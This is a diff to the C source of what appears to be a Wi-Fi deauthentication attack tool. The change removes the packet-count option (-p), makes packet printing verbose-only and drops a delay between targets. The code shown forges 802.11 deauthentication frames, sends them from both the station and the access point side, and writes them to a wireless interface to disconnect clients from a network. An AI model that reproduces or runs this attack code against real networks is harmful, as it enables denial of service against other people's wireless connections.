@@ -13,8 +13,7 @@
 #define DESTINATION 'd'
 #define SOURCE 's'
 #define BSSID 'b'
-#define DEFAULT_HOW_MANY_PACKETS_TO_SEND 42
-#define VERSION "0.8"
+#define VERSION "0.9"
 #define VERSION_DATE "Jan 2014"
 
 static struct wif *_wif; // wireless interface
@@ -180,7 +179,9 @@ int send_packet(uchar *buf, size_t count)
 {
     uchar* to_send = malloc(count);
     memcpy(to_send, buf, count);
-    print_packet(to_send, count);
+    if (verbose) 
+        print_packet(to_send, count);
+    
     if (wi_write(_wif, to_send, count, NULL) == -1) {
         switch (errno) {
         case EAGAIN:
@@ -429,9 +430,8 @@ uchar *get_target(uchar *bssid)
     }
 }
 
-void deauthenticate_station(uchar *bssid, uchar *station, int how_many)
+void deauthenticate_station(uchar *bssid, uchar *station)
 {
-    int counter = 0;
     struct packet result_packet = create_deauth_frame(station, bssid, bssid, 1);
 
     if (verbose)
@@ -440,10 +440,9 @@ void deauthenticate_station(uchar *bssid, uchar *station, int how_many)
         print_packet(result_packet.data, result_packet.length);
     }
 
-    //for (counter = 0; counter < how_many; counter++)
-        send_packet(result_packet.data, result_packet.length);
+    send_packet(result_packet.data, result_packet.length);
 
-    if (verbose) printf("%d packets send\n\n", how_many);
+    if (verbose) printf("packet send\n\n");
 
     result_packet = create_deauth_frame(station, bssid, bssid, 0);
 
@@ -453,10 +452,9 @@ void deauthenticate_station(uchar *bssid, uchar *station, int how_many)
         print_packet(result_packet.data, result_packet.length);
     }
 
-    //for (counter = 0; counter < how_many; counter++)
-        send_packet(result_packet.data, result_packet.length);
+    send_packet(result_packet.data, result_packet.length);
 
-    if (verbose) printf("%d packets send\n\n", how_many);
+    if (verbose) printf("packet send\n\n");
 
     result_packet = create_deauth_frame(bssid, station, bssid, 1);
 
@@ -466,10 +464,9 @@ void deauthenticate_station(uchar *bssid, uchar *station, int how_many)
         print_packet(result_packet.data, result_packet.length);
     }
 
-    //for (counter = 0; counter < how_many; counter++)
-        send_packet(result_packet.data, result_packet.length);
+    send_packet(result_packet.data, result_packet.length);
 
-    if (verbose) printf("%d packets send\n\n", how_many);
+    if (verbose) printf("packet send\n\n");
 
     result_packet = create_deauth_frame(bssid, station, bssid, 0);
 
@@ -479,14 +476,13 @@ void deauthenticate_station(uchar *bssid, uchar *station, int how_many)
         print_packet(result_packet.data, result_packet.length);
     }
 
-    //for (counter = 0; counter < how_many; counter++)
-        send_packet(result_packet.data, result_packet.length);
+    send_packet(result_packet.data, result_packet.length);
 
-    if (verbose) printf("%d packets send\n\n    ", how_many);
+    if (verbose) printf("packet send\n\n");
 
     if (!silent)
     {
-        printf("Attack with %d packets station ", 4 * how_many);
+        printf("%d packets sended for deauthing ", 4 );
         print_mac(station);
     }
 }
@@ -506,8 +502,6 @@ void print_help()
         " -c <channel>      Channel - specify this only if you      \n"
         "                   are not currently connected to the      \n"
         "                   network.                                \n"
-        " -p <num>          How many packets to send.               \n"
-        "                   Default 42.                             \n"
         " -v, --verbose     Verbose output.                         \n"
         " -s, --silent      Silent all output.                      \n"
         " -h, --help        Will print this text and exit.          \n"
@@ -523,7 +517,7 @@ void print_version()
 int main(int argc, const char *argv[])
 {
     uchar *bssid;
-    int channel = 0, t, how_many = DEFAULT_HOW_MANY_PACKETS_TO_SEND;
+    int channel = 0, t;
     const char *list_file = NULL;
 
     if (geteuid() != 0)
@@ -570,15 +564,6 @@ int main(int argc, const char *argv[])
             {
                 print_help();
                 return 1;
-            }
-        }
-        else if (!strcmp(argv[t], "-p") && argc >= t+1)
-        {
-            how_many = atoi(argv[++t]);
-            if (how_many < 2 || how_many > 256)
-            {
-                printf("\nNumber of packets shoul be between 2 and 256.\n");
-                how_many = DEFAULT_HOW_MANY_PACKETS_TO_SEND;
             }
         }
         else if (!strcmp(argv[t], "-h") || !strcmp(argv[t], "--help"))
@@ -676,10 +661,9 @@ int main(int argc, const char *argv[])
             print_packet(target_packet, MAX_PACKET_LENGTH);
         }
 
-        deauthenticate_station(bssid, station, how_many);
+        deauthenticate_station(bssid, station);
 
         free(target_packet);
-        usleep(5000);
     }
 
     free(bssid);
